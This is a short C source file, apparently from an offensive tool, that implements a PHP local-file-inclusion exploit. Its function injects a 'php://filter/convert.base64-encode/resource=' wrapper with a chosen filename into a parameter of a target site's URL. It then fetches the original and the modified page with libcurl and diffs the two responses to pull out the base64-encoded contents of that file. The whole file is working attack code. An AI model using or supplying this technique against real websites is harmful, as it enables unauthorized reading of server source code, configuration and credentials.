#include "explotation/php-filter.h"
#include "request/request.h"
#include "string/concat.h"
#include "string/diff.h"
#include "string/utils.h"
#include "string/url.h"

#include <stdlib.h>

char *phpfilter(url_t *url, const char *oldurl, const char *filename, int pnumber){
    request_t req1, req2;
    char *filter, *newurl, *b64 = NULL;

    request_init(&req1);
    request_init(&req2);

    filter = concatl("php://filter/convert.base64-encode/resource=", filename, NULL);
    newurl = buildurl(url, string_replace, filter, pnumber);
    free(filter);

    curl_easy_setopt(req1.ch, CURLOPT_URL, oldurl);
    curl_easy_setopt(req2.ch, CURLOPT_URL, newurl);

    if(request_exec(&req1) || request_exec(&req2))
        goto end;

    b64 = diff(req1.body.ptr, req2.body.ptr);
    if(b64)
        trim(&b64);

    end:
    free(newurl);
    request_free(&req1);
    request_free(&req2);

    return b64;
}
